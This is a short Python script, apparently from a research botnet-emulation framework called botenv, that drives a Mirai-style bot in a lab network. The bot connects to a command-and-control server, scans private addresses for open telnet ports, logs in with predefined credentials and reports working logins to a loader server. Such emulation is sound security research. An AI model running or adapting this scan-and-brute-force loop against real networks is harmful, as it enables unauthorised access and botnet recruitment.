"""
 Software Name : botenv
 SPDX-FileCopyrightText: Copyright (c) 2021 Orange
 SPDX-License-Identifier: GPL-2.0-only

 This software is distributed under the GNU General Public License v2 only,
 the text of which is available at https://spdx.org/licenses/GPL-2.0-only.html
 or see the 'LICENCE' file for more details.

 Author: Elkin AGUAS <elkin.aguas@orange.com>
"""

from botenv import bot, rando

# Creates bot instance
bot1 = bot.bot("bot1")
# Start bot and connect to the C&C server
bot1.start_bot(cc_ip='192.168.100.11', heart_beat=5)

while (1):
    for index in range(6):
        devices = []
        # Scan network for vulnerable devices
        devices.append(bot1.scanner_init("192.168.100."+str(3+index), [23]))
        devices = [device for device in devices if device is not None]
        print(devices)
        if devices:
            # Try to login to device with telnet ports opened
            # with predefined user and password
            device, auth_info = bot1.telnet_login(devices)
            # Report user and password to loader server
            print(device)
            if device != None:
                bot1.report_working(loader_ip = '192.168.100.12', device=device, auth_info=auth_info)

